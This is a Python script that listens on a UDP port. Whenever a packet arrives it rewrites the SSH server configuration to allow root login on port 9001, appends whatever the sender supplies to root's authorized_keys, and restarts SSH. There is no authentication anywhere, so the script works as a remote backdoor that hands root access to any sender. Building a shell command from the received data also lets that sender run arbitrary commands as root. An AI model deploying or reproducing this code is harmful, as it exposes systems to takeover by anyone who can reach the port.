# coding: utf-8

import socket
from subprocess import call
from os.path import exists

def Messages(sock, data, address):
	f = open("/etc/ssh/sshd_config", 'w');
	f.write("#	$OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $\n\n# This is the sshd server system-wide configuration file.  See\n# sshd_config(5) for more information.\n\n# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin\n\n# The strategy used for options in the default sshd_config shipped with\n# OpenSSH is to specify options with their default value where\n# possible, but leave them commented.  Uncommented options override the\n# default value.\n\nInclude /etc/ssh/sshd_config.d/*.conf\n\nPort 9001\n#AddressFamily any\n#ListenAddress 0.0.0.0\n#ListenAddress ::\n\n#HostKey /etc/ssh/ssh_host_rsa_key\n#HostKey /etc/ssh/ssh_host_ecdsa_key\n#HostKey /etc/ssh/ssh_host_ed25519_key\n\n# Ciphers and keying\n#RekeyLimit default none\n\n# Logging\n#SyslogFacility AUTH\n#LogLevel INFO\n\n# Authentication:\n\n#LoginGraceTime 2m\nPermitRootLogin yes\n#StrictModes yes\n#MaxAuthTries 6\n#MaxSessions 10\n\n#PubkeyAuthentication yes\n\n# Expect .ssh/authorized_keys2 to be disregarded by default in future.\n\n#AuthorizedKeysFile	.ssh/authorized_keys .ssh/authorized_keys2\n\n#AuthorizedPrincipalsFile none\n\n#AuthorizedKeysCommand none\n#AuthorizedKeysCommandUser nobody\n\n# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts\n#HostbasedAuthentication no\n# Change to yes if you don't trust ~/.ssh/known_hosts for\n# HostbasedAuthentication\n#IgnoreUserKnownHosts no\n# Don't read the user's ~/.rhosts and ~/.shosts files\n#IgnoreRhosts yes\n\n# To disable tunneled clear text passwords, change to no here!\nPasswordAuthentication no\n#PermitEmptyPasswords no\n\n# Change to yes to enable challenge-response passwords (beware issues with\n# some PAM modules and threads)\nChallengeResponseAuthentication no\n\n# Kerberos options\n#KerberosAuthentication no\n#KerberosOrLocalPasswd yes\n#KerberosTicketCleanup yes\n#KerberosGetAFSToken no\n\n# GSSAPI options\n#GSSAPIAuthentication no\n#GSSAPICleanupCredentials yes\n#GSSAPIStrictAcceptorCheck yes\n#GSSAPIKeyExchange no\n\n# Set this to 'yes' to enable PAM authentication, account processing,\n# and session processing. If this is enabled, PAM authentication will\n# be allowed through the ChallengeResponseAuthentication and\n# PasswordAuthentication.  Depending on your PAM configuration,\n# PAM authentication via ChallengeResponseAuthentication may bypass\n# the setting of \"PermitRootLogin without-password\".\n# If you just want the PAM account and session checks to run without\n# PAM authentication, then enable this but set PasswordAuthentication\n# and ChallengeResponseAuthentication to 'no'.\nUsePAM yes\n\n#AllowAgentForwarding yes\n#AllowTcpForwarding yes\n#GatewayPorts no\nX11Forwarding yes\n#X11DisplayOffset 10\n#X11UseLocalhost yes\n#PermitTTY yes\nPrintMotd no\n#PrintLastLog yes\n#TCPKeepAlive yes\n#PermitUserEnvironment no\n#Compression delayed\n#ClientAliveInterval 0\n#ClientAliveCountMax 3\n#UseDNS no\n#PidFile /var/run/sshd.pid\n#MaxStartups 10:30:100\n#PermitTunnel no\n#ChrootDirectory none\n#VersionAddendum none\n\n# no default banner path\n#Banner none\n\n# Allow client to pass locale environment variables\nAcceptEnv LANG LC_*\n\n# override default of no subsystems\nSubsystem	sftp	/usr/lib/openssh/sftp-server\n\n# Example of overriding settings on a per-user basis\n#Match User anoncvs\n#	X11Forwarding no\n#	AllowTcpForwarding no\n#	PermitTTY no\n#	ForceCommand cvs server");
	f.close()
	sock.sendto(("[+] ssh_config").encode("utf-8"), address)
	data, address = sock.recvfrom(1024)
	if (exists("/root/.ssh/") == False):
		call("sudo mkdir /root/.ssh", shell = "True")
		call("sudo touch /root/.ssh/authorized_keys", shell = "True")
	else:
		if (exists("/root/.ssh/authorized_keys") == False):
			call("sudo touch /root/.ssh/authorized_keys", shell = "True")
			
			
	ret = call("sudo echo '{}' >> /root/.ssh/authorized_keys".format(data.decode("utf-8")), shell="True")
		
	if (ret == 0):
		sock.sendto(("[+] pub key").encode("utf-8"), address)
		ret = call("service ssh restart", shell="True")
		if (ret == 0):
			sock.sendto(("[+] ssh restarted\nOK").encode("utf-8"), address)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(("192.168.0.17", 9002))

while True:
	try:
		data, addr = sock.recvfrom(1024)
		Messages(sock, data.decode("utf-8"), addr)
	except:
		pass

sock.close()
